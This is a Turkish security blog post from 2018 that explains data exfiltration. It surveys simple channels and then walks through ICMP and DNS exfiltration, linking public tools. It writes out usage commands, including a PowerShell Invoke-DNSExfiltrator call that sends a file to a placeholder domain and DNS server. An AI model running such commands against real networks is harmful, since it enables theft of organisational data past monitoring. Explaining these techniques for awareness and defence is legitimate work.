Title: Data Exfiltration
Date: 2018-11-11 13:48
Tags: data exfil, veri kaçırma, veri kaçırma yöntemleri, data exfiltration türkçe, veri güvenliği
Category: Siber Güvenlik
Slug: data-exfiltration
Authors: 0x656e




**Bu yazı tamamen bilgilendirme amaçlıdır.**
## Data Exfiltration Nedir?

Bir kişi veya grubun yetkisiz bir biçimde bir veriyi başka bir bilgisayar yada sunucuya kopyalaması, transfer etmesi anlamına gelir. Data extrusion(veri çıkarma), data exportation(veri ihracati!), data theft(veri hırsızlığı) olarak da bilinir.

Örnek vermek gerekirse bir banka çalışanının bankaya ait verileri bir USB(!) içerisinde dışarıya çıkartması bir suçtur. Fakat işler her zaman bu şekilde USB gibi şeyler ile de olmamaktadır. Bazen veri kaçırmayı tanımlamak çok zor hale gelebilmektedir. Farklı yöntemleri vardır.

Bu yazıda sizlere yöntemlerinden kısaca bahsedeceğim.



## Basit Yöntemler 

### E-Posta
Aklımıza gelebilecek en kolay çözüm bir veriyi kaçırmak istersek bunu eposta ile gönderebilir ve karşı tarafta indirerek işlem tamamlanmış olabilir. Fakat burada engelleme adına Email gatewayler karşımıza çıkmaktadır. Email gatewayler temel olarak mail içerisinde zararlı var mı diye kontrol eder fakat içerisinde data kaçırmaya karşı modüllerde bulunmaktadır. Tabi burada Titus gibi yazılımlar ile birlikte datanın sınıflandırması, arkaplanda bunların loglarının tutulması da bir engel olarak görülebilir.

`Parola korumalı bir sıkıştırılmış dosyayı nasıl farkedeceklerini bilmiyorum. Ama farkedemeyeceklerini düşünüyorum.`


### Cihazlara Yüklemek

Günümüzde yanımızda bir çok akıllı cihaz taşıyoruz. Bu kısımda kurum içerisinde ki bir datayı kaçırmak isteyen kişinin telefonuna, taşınabilir diskine, laptop kullanılıyorsa bluetooth ile telefonuna atması işten bile değildir. Hatta günümüzde web.whatsapp gibi bir arayüz ile whatsapp üzerinden bile kaçırılabilir.

`Bu kısım sıkı bir takip istemekte birlikte nasıl engellenebileceği konusunda bir yorumum dahi bulunmamaktadır.`

## Teknik Yöntemler

Bu kısımda data exfiltration kısmında karşımıza bir çok yöntem çıkmakta tabi ki teknik zorlukları da bulunmaktadır. 


### FTP&SFTP
Aslında çokta teknik olmayan bir konudur. Uzaktaki bir sunucuya FTP&SFTP servis kurulur ve veriler bu servisler aracılığı ile dışarıya çıkartılabilir.

Önlemek için giden trafiği inceleyecek güvenlik cihazları/yazılımları yeterli olacaktır. Trafik içerisinde gönderilen trafik boyutuda önemli bir faktördür tabi ki. Zaten çoğu güvenlik ürünü anomaly'i farkedecektir.

### HTTP Methodları ile Göndermek

Bu kısımda çok teknik bir konu değildir aslında. Basit bir Web Servis yazıp bu web servise bir form koyup buradan gelecek tüm verinin arkaplanda ayrı ayrı yazıldığını düşünürseniz gayet kolaydır. Hatta çıkartılacak veriyi binary code çevirip basarsanız ve arkaplanda tekrar eski haline çevirirseniz ihtiyaçlarınızı karşılayacaktır.

## 

**Asıl Bahsetmek İstediğim Kısıma Gelelim**

Bu kısımdan önceki yazılar tamamen genel anlamda nasıl olduğundan bahsetmek amacıylaydı.



Bu kısımda daha önce karşıma çıkmış olan 2 adet yöntemden bahsedeceğim, zaten yazının ana konusu bu 2 yöntemdir.


### ICMP Data Exfiltration

ICMP protokolü kullanılarak yapılan yöntemdir. Yani genel anlamda bizim bildiğimiz ping komutu ile birlikte yapılan işlemlerdir. ICMP protokolü içerisinde çok fazla data veya bilgi barındırmaz basit yapıda bir protokoldür bu sebeple data exfiltration işlemleri yavaş ilerleyecektir. Kişiler ICMP Echo Requestler içerisinde göndermek istedikleri datanın binary halini atarak dışarıya veri sızdırabilmektedirler.

ICMP Paketlerinin boyutu 74 bytedır. Data exfiltration kısmında genellikle 100 byte ile 542 byte arasını geçmemektedir.

`Engellemek adına yeni nesil tüm cihazlar bozuk ICMP paketlerini tespit edebilecek seviyededirler.`

#### Nasıl Yapılır?

[ICMPExfil](https://github.com/martinoj2009/ICMPExfil)

Yukarıda vermiş olduğum linkteki araç ile ping.py ve server.py dosyaları kullanılarak bu işlem gerçekleştirilebilir.

`ping.py --ip PINGATACAGINIZSERVER --asciiFile göndereceğinizdosya`


### DNS Data Exfiltration

DNS üzerinden data exfiltration yapmaya yarar. DNS'in çalışma mantığını kullanır. 
Nedir DNS'in çalışma mantığı?

Gitmek istediğimiz bir domain'e ait olan IP'yi dünya üzerindeki veya bizim kendi networkümüzde bulunan bir DNS sunucuya sorar. DNS sunucuda kendisinde var ise bu domaine ait olan IP'yi geri döndürür ve site girmiş olursunuz, eğer yoksa sormuş olduğunuz dns servisi bir üst makama gidip root dns sunucularına sorar ve size de bu şekilde elçilik yapmış olur.

Bu kısımda data exfiltration için DNS sorgusu içerisinde ki CNAME ve TXT kayıtları kullanılmaktadır. Bu sayede paket içerisine yapısal olmayan bir çok veri koyulabilmektedir. 


#### Nasıl Yapılır

[DNS Exfiltrator](https://github.com/Arno0x/DNSExfiltrator)

Bu kısımda kendinize ait bir sunucunuz olması gerekmektedir. Yukarıda vermiş olduğum link içerisinden dnsefiltrator.py dosyasını belirli argümanlarla çalıştırmanız gerekmektedir. Yazılım defaultta RC4 şifreleme yapmaktadır bu sebeple argüman olarak vermiş olduğunuz parola oldukça önemlidir.

Server üzerinde 
`dnsexfiltrator.py -d domain -p PAROLA`


Client üzerinde
```
c:\DNSExfiltrator> powershell
PS c:\DNSExfiltrator> Import-Module .\Invoke-DNSExfiltrator.ps1
PS c:\DNSExfiltrator> Invoke-DNSExfiltrator -i inputFile -d mydomain.com -p password -s my.dns.server.com -t 500

```

* -i argümanı ile göndermek istediğiniz dosya 
* -d argümanı ile server kısmında belirlemiş olduğunuz domainismi 
* -p kısmı ile server kısmında belirtmiş olduğunuz encrytion için kullanılacak parola 
* -s kısmında ise sunucunuzun IP adresi 
* -t kısmında ise throttleTime yani DNS sorguları arasında geçecek süreyi girmeniz gerekmektedir.(MS)

Dilerseniz -h parametresini kullanarak Google, CF gibi HTTP üzerinden DNS servislerinide kullanabilirsiniz.


Yazıyı burada sonlandırıyorum. Daha detaylı bilgilere ulaşmak veya daha fazla teknik okumak/görmek isterseniz aşağıdaki linki kullanabilirsiniz.

[Data Exfiltration Techniques](https://www.pentestpartners.com/security-blog/data-exfiltration-techniques/)


**Burada anlatılanlar hakkında yaptığınız,yapacağınız tüm işlemlerden sizler sorumlusunuz. Mesuliyet kabul edilmemektedir.**

